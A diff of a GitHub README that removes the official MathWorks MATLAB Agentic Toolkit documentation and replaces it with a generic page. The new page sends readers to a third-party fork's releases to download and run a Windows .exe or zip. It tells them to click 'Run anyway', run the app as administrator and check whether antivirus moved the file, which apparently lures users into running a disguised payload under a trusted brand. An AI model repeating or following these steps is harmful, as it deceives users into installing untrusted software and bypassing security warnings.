@@ -1,159 +1,158 @@
-# MATLAB&reg; Agentic Toolkit
-The MATLAB Agentic Toolkit brings trusted MATLAB capabilities to AI agents, making engineering and scientific workflows agent-ready.
+# 🤖 matlab-agentic-toolkit - MATLAB for agent-driven workflows
 
-## What It Does
-AI coding agents are increasingly capable with MATLAB — but capability isn't expertise. Without guidance, agents reinvent what toolbox functions already provide, miss features they don't know about, and burn through extra steps that an experienced MATLAB user would skip. The MATLAB Agentic Toolkit gives your agent the knowledge and context to work efficiently from the start.
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/vikto2953/matlab-agentic-toolkit/releases)
 
-The toolkit connects your AI agent to MATLAB and equips it with expert knowledge — the workflows, conventions, and best practices to make the best use of MATLAB while minimizing token burn. Your agent learns to write idiomatic code, generate and run tests, diagnose errors, build apps, and more.
+## 🚀 Overview
 
-The toolkit works with today's leading AI coding agents and is designed to evolve as the landscape changes.
+matlab-agentic-toolkit brings MATLAB tools into workflows that use AI agents. It helps you run engineering and science tasks with a simpler setup. You can use it to connect MATLAB with agent tools and keep your work in one place.
 
-> [!IMPORTANT]
-> To use AI agents with Simulink, install the [Simulink Agentic Toolkit](https://github.com/matlab/simulink-agentic-toolkit).
+This tool is built for end users who want to:
+- open MATLAB from a guided setup
+- connect it to agent-based tools
+- run engineering tasks with less manual setup
+- keep MATLAB work ready for Copilot, Claude Code, or similar tools
 
-## How It Works
-The toolkit has two jobs. First, it gives your agent a live connection to MATLAB — so it can run code, execute tests, and analyze results, not just read and write files. Second, it provides curated expertise (called *skills*) that teach your agent how an experienced MATLAB engineer would approach a task. Your agent reads the relevant skill, then uses the MATLAB connection to do the work.
+## 📥 Download
 
-The toolkit ships automated setup for all supported platforms. Clone the repository, launch your agent, and ask it to set up the toolkit.
+Visit this page to download:
+https://github.com/vikto2953/matlab-agentic-toolkit/releases
 
+On that page, look for the latest release and download the Windows file that matches your device. If you see a `.zip` file, download it and extract it first. If you see an `.exe` file, download and run it.
 
-## Supported Platforms
+## 🪟 Windows Setup
 
-| Platform | Setup | Notes |
-|----------|-------|-------|
-| [Claude Code](https://claude.ai/code) | Automated | Also supports [no-clone marketplace install](#claude-code-marketplace-install) (skills only) |
-| [GitHub&reg; Copilot](https://github.com/features/copilot) | Automated | |
-| [OpenAI&reg; Codex](https://openai.com/codex) | Automated | |
-| [Gemini&trade; CLI](https://github.com/google-gemini/gemini-cli) | Automated | |
-| [Sourcegraph Amp](https://ampcode.com/) | Automated | |
-| [Cursor](https://www.cursor.com/) | Manual | Untested |
+Follow these steps on Windows:
 
-> Automated setup has been verified with basic workflows on each platform except Cursor. The toolkit is under active development — please [report issues](https://github.com/matlab/matlab-agentic-toolkit/issues) if you encounter problems.
+1. Open the download link above.
+2. Find the latest release.
+3. Download the Windows version.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or launcher file.
+7. If Windows asks for permission, choose Run anyway.
+8. Follow the on-screen steps until setup finishes.
 
-## Quick Start
+If you use a work computer, you may need admin access to install or open the app.
 
-> **Full walkthrough:** See the [Getting Started guide](GETTING_STARTED.md) for detailed instructions, platform-specific notes, verification steps, and troubleshooting.
+## ✅ What You Need
 
-**Prerequisites:**
-* MATLAB R2020b or later
-* Supported AI coding agent
-* Git&trade;
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- Enough free space for MATLAB files and project data
+- A stable internet connection for the first download
+- MATLAB installed if your release expects a local MATLAB install
+- Permission to run downloaded software
 
-The MATLAB Agentic Toolkit helps you install and configure the [MATLAB MCP Core Server](https://github.com/matlab/matlab-mcp-core-server), or can be configured to use your existing installation.
+For best results, close other large apps before you start.
 
-### Full Setup (recommended)
+## 🔧 What It Does
 
-Clone the repository, launch your agent from the toolkit directory, and ask it to set up the toolkit.
+This toolkit helps with common engineering tasks such as:
+- running MATLAB-based steps from agent tools
+- working with scientific data
+- handling scripts and calculations
+- linking MATLAB work to AI agent flows
+- using agent-ready skills for repeat tasks
 
-```bash
-git clone https://github.com/matlab/matlab-agentic-toolkit.git
-cd matlab-agentic-toolkit
-```
+It fits use cases like:
+- test and analysis tasks
+- math-heavy workflows
+- design checks
+- data processing
+- automation around MATLAB projects
 
-Launch your agent (`claude`, `codex`, `gemini`, etc.) and ask:
+## 🧭 First Run
 
-```
-Set up the MATLAB Agentic Toolkit
-```
+When you open the app for the first time, you may see setup prompts. Use them in this order:
 
-Setup looks for your MATLAB installation(s), downloads the MCP server, writes your agent's global configuration, and registers skills. Once complete, start a new session in any project directory — MATLAB tools and skills are available everywhere.
+1. Choose your language if asked.
+2. Accept any local permission prompts.
+3. Point the tool to your MATLAB install if it asks for it.
+4. Let it finish its first check.
+5. Open a sample workflow or default project if one appears.
 
-<a id="claude-code-marketplace-install"></a>
-> **Claude Code — no clone required:** If you already have the [MCP server](https://github.com/matlab/matlab-mcp-core-server) configured, you can add skills directly without cloning:
-> ```bash
-> claude plugin marketplace add "https://github.com/matlab/matlab-agentic-toolkit"
-> claude plugin install matlab-core@matlab-agentic-toolkit
-> ```
-> This installs skills only. Your existing MCP configuration is not modified. See the [Getting Started guide](GETTING_STARTED.md#adding-skills-only) for details.
+If the app asks for a folder, pick a simple location such as `Documents\matlab-agentic-toolkit`.
 
-### Already Have the MCP Server?
+## 🧩 Common Use With Agent Tools
 
-If you installed the [MATLAB MCP Core Server](https://github.com/matlab/matlab-mcp-core-server) yourself, you just need skills. See [Adding Skills Only](GETTING_STARTED.md#adding-skills-only) in the Getting Started guide.
+This toolkit is made for agent workflows. That means it can help when you want MATLAB to work with tools such as:
+- Claude Code
+- Codex plugin setups
+- GitHub Copilot flows
+- other engineering agents
 
-### Verify
-Ask your agent:
+In practice, this can help you move between natural language tasks and MATLAB actions with less setup.
 
-```
-What version of MATLAB is running? List the installed toolboxes.
-```
+## 📂 Typical Files and Folders
 
-## MCP Tools
-Provided by the [MATLAB MCP Core Server](https://github.com/matlab/matlab-mcp-core-server):
+After setup, you may see files such as:
+- config files for your local setup
+- logs for troubleshooting
+- sample scripts
+- project folders
+- tool connection files
 
-| Tool | What your agent can do |
-|------|------------------------|
-| `evaluate_matlab_code` | Run MATLAB code and return command window output |
-| `run_matlab_file` | Run a MATLAB program |
-| `run_matlab_test_file` | Run tests via `runtests` with structured results |
-| `check_matlab_code` | Static analysis with the Code Analyzer |
-| `detect_matlab_toolboxes` | List installed MATLAB version and toolboxes |
+Keep these files together in one folder so they are easy to find later.
 
-The server also provides two MCP resources: `matlab_coding_guidelines` (coding standards) and `plain_text_live_code_guidelines` (Live Script format rules).
+## 🔍 How to Use It
 
-## Agent Skills
-Skills are organized in the [skills catalog](skills-catalog/).
+Use the toolkit in a simple flow:
 
-<!-- BEGIN SKILLS -->
-**MATLAB App Building** — MATLAB app building skills for AI coding agents.
+1. Start the app or launcher.
+2. Connect to MATLAB if needed.
+3. Open or create a task.
+4. Run the task from the agent tool or local interface.
+5. Review the output in MATLAB or in the toolkit window.
 
-| Skill | What it teaches your agent |
-|-------|---------------------------|
-| `matlab-build-app` | Build MATLAB apps programmatically using uifigure, uigridlayout, UI components, callbacks, and uihtml for web integration. |
+If you work on repeated tasks, save your setup so you can use it again.
 
-**MATLAB Core** — foundational MATLAB skills for AI coding agents.
+## 🛠️ Troubleshooting
 
-| Skill | What it teaches your agent |
-|-------|---------------------------|
-| `matlab-create-live-script` | Create plain-text MATLAB Live Scripts (.m files) with rich text formatting, LaTeX equations, section breaks, and inline figures. |
-| `matlab-debugging` | Diagnose MATLAB errors and unexpected behavior. |
-| `matlab-install-products` | Deterministic workflow to download MATLAB Package Manager (mpm) and install MathWorks products from the OS command line with consistent, repeatable behavior. |
-| `matlab-list-products` | Show all installed MATLAB products and support packages for a given MATLAB installation folder. |
-| `matlab-review-code` | Review MATLAB code for quality, performance, maintainability, and adherence to MathWorks coding standards. |
-| `matlab-testing` | Generate and run MATLAB unit tests using matlab.unittest and matlab.uitest. |
+If something does not work:
 
-**MATLAB Software Development** — MATLAB software development skills for AI coding agents.
+- Make sure MATLAB is installed
+- Check that you opened the correct release file
+- Reboot your PC and try again
+- Run the app as administrator
+- Check that Windows did not block the file
+- Make sure your antivirus did not move the file
+- Try extracting the ZIP file again if setup failed
 
-| Skill | What it teaches your agent |
-|-------|---------------------------|
-| `matlab-modernize-code` | Modernize deprecated MATLAB functions and patterns. |
+If the tool cannot find MATLAB, open the settings and point it to the MATLAB install folder.
 
-**Reporting and Database Access** — reporting and database access skills for AI coding agents.
+## 🔒 Safe Download Tips
 
-| Skill | What it teaches your agent |
-|-------|---------------------------|
-| `matlab-map-database-objects` | Generates MATLAB Object Relational Mapping (ORM) code using Database Toolbox. |
-| `matlab-read-database` | Reads data from relational databases using MATLAB Database Toolbox pushdown capabilities. |
-| `matlab-use-duckdb` | Generates MATLAB code for DuckDB database operations using Database Toolbox. |
-| `matlab-write-database` | Writes data from MATLAB to relational databases and performs database operations. |
+Use only the release page linked above. Check that the file name matches the release you want. If Windows shows a security prompt, review the file name and source before you continue.
 
-**Toolkit** — setup and management for the MATLAB Agentic Toolkit.
+## 📌 Project Fit
 
-| Skill | What it teaches your agent |
-|-------|---------------------------|
-| `matlab-agentic-toolkit-setup` | Install and configure the MATLAB Agentic Toolkit — detect MATLAB, install the MCP server, register with your AI coding agent, and verify the environment. |
+matlab-agentic-toolkit is a good fit if you:
+- use MATLAB often
+- want to connect MATLAB to AI agent tools
+- work on science or engineering tasks
+- want a cleaner path from prompt to MATLAB action
+- need a local tool for repeatable workflows
 
-<!-- END SKILLS -->
+## 🧪 Example Workflow
 
-## Trademarks
-MATLAB and Simulink are registered trademarks of The MathWorks, Inc. See [mathworks.com/trademarks](https://www.mathworks.com/trademarks) for a list of additional trademarks. Other product or brand names may be trademarks or registered trademarks of their respective holders.
+A simple example:
 
-## Contributing
-We welcome feedback through [GitHub Issues](https://github.com/matlab/matlab-agentic-toolkit/issues). Pull requests are reviewed for ideas and feedback but are not merged from external contributors. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+1. Open the toolkit.
+2. Load a MATLAB task.
+3. Ask an agent tool to prepare the steps.
+4. Run the task in MATLAB.
+5. Review the result and save the output.
 
-## Licensing and Usage 
-The MATLAB Agentic Toolkit is licensed with [MathWorks BSD-3 Clause](LICENSE). It is solely for use in conjunction with MathWorks products and service offerings.
+This keeps the work in a clear path from request to result.
 
-## Contact Support
-MathWorks encourages you to use this repository and provide feedback. To request technical support or submit an enhancement request, [create a GitHub issue](https://github.com/matlab/matlab-agentic-toolkit/issues) or email [genai-support@mathworks.com](mailto:genai-support@mathworks.com). For MATLAB MCP Core Server issues and support, see the [MATLAB MCP Core Server](https://github.com/matlab/matlab-mcp-core-server) repository.
+## 📎 Download Again
 
-#
-When using the MATLAB Agentic Toolkit and MATLAB MCP Core Server, you should thoroughly review and validate all tool calls before you run them. Always keep a human in the loop for important actions and only proceed once you are confident the call will do exactly what you expect. For more information, see [User Interaction Model (MCP)](https://modelcontextprotocol.io/specification/2025-06-18/server/tools#user-interaction-model) and [Security Considerations (MCP)](https://modelcontextprotocol.io/specification/2025-06-18/server/tools#security-considerations).
+[Download the latest release on GitHub](https://github.com/vikto2953/matlab-agentic-toolkit/releases)
 
-The MATLAB MCP Core server may only be used with MATLAB installations that are used as a Personal Automation Server. Use with a central Automation Server is not allowed. Please contact MathWorks if Automation Server use is required. For more information see the [Program Offering Guide (MathWorks)](https://www.mathworks.com/help//pdf_doc/offering/offering.pdf).
+## 🧰 Notes for Daily Use
 
-----
-
-Copyright 2026 The MathWorks, Inc.
-
-----
-
+- Keep MATLAB updated
+- Keep the toolkit in the same folder
+- Save your settings after first setup
+- Use one project folder for each task type
+- Store important outputs in a separate results folder
